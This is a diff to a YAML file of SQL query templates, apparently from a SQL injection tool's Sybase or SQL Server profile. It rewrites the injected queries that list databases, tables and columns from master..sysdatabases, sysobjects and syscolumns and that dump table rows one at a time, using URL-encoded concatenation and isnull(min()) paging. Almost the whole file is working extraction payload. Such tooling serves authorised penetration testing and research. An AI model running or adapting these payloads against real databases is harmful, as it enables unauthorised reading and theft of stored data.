@@ -18,17 +18,19 @@ resource:
        %2b'${trail_sql}'
        r
    from (
-       select
-           '${enclose_value_sql}'
-           %2bt.name
-           %2b'${separator_qte_sql}0${enclose_value_sql}'
-           rr
-       from
-          (select distinct name from master..sysdatabases) t,
-          (select distinct name from master..sysdatabases) t1
-       where t.name >= t1.name
-       group by t.name
-       ${limit}
+       /* isnull(min) with null enforcing single query result for proper trail */
+       select isnull(
+           min(
+               '${enclose_value_sql}'
+               %2bt.name
+               %2b'${separator_qte_sql}0${enclose_value_sql}'
+           ),
+           null
+       ) rr
+       from master..sysdatabases t
+       where ${limit} = (
+           select count(*) from master..sysdatabases t1 where t.name >= t1.name
+       ) 
    ) a
 
   table: |
@@ -37,17 +39,18 @@ resource:
        %2b'${trail_sql}'
        r
    from (
-       select
-           '${enclose_value_sql}'
-           %2bt.name
-           %2b'${separator_qte_sql}0${enclose_value_sql}'
-           rr
-       from
-          (select distinct name from ${database}..sysobjects where type = 'U') t,
-          (select distinct name from ${database}..sysobjects where type = 'U') t1
-       where t.name >= t1.name
-       group by t.name
-       ${limit}
+       select isnull(
+           min(
+               '${enclose_value_sql}'
+               %2bt.name
+               %2b'${separator_qte_sql}0${enclose_value_sql}'
+           ),
+           null
+       ) rr
+       from ${database}..sysobjects t
+       where ${limit} = (
+           select count(*) from ${database}..sysobjects t1 where t.name >= t1.name and t1.type != 'P'
+       )
    ) a
 
   column: |
@@ -56,17 +59,21 @@ resource:
        %2b'${trail_sql}'
        r
    from (
-       select
-           '${enclose_value_sql}'
-           %2bt.name
-           %2b'${separator_qte_sql}0${enclose_value_sql}'
-           rr
-       from
-           (select distinct c.name from ${database}..syscolumns c inner join ${database}..sysobjects t on c.id = t.id where t.name = '${table}')t,
-           (select distinct c.name from ${database}..syscolumns c inner join ${database}..sysobjects t on c.id = t.id where t.name = '${table}')t1
-       where t.name >= t1.name
-       group by t.name
-       ${limit}
+       select isnull(
+           min(
+               '${enclose_value_sql}'
+               %2bt.name
+               %2b'${separator_qte_sql}0${enclose_value_sql}'
+           ),
+           null
+       ) rr
+       from ${database}..syscolumns t
+       where ${limit} = (
+           select count(*) from ${database}..syscolumns c2 inner join ${database}..sysobjects t2
+           on c2.id = t2.id and c2.id = t.id
+           where t2.name = '${table}'
+           and t.name >= c2.name
+       )
    ) a
 
   row:
@@ -76,17 +83,19 @@ resource:
         %2b'${trail_sql}'
         r
     from (
-        select
-            '${enclose_value_sql}'
-            %2bt.s
-            %2b'${separator_qte_sql}0${enclose_value_sql}'
-            rr
-        from
-           (select distinct ${fields} s from ${database}..${table}) t,
-           (select distinct ${fields} s from ${database}..${table}) t1
-        where t.s >= t1.s
-        group by t.s
-        ${limit}
+        select isnull(
+           min(
+               '${enclose_value_sql}'
+               %2bt.s
+               %2b'${separator_qte_sql}0${enclose_value_sql}'),
+           null
+        ) rr
+        from (select distinct ${fields} s from ${database}..${table}) t
+        where ${limit} = (
+           select count(*)
+           from (select distinct ${fields} s from ${database}..${table}) t1
+           where t.s >= t1.s
+        )
     ) a
    fields:
     field: |
@@ -95,7 +104,6 @@ resource:
              convert(
                  varchar,
                  ${field.value}
-                 %2b ''
              )
          )
      )
@@ -114,7 +122,7 @@ strategy:
    from (
        ${injection}
    ) x
-  limit: having count(*) between ${limit.value} and ${limit.value}
+  limit: ${limit.value}
   failsafe: |
    select
        convert(
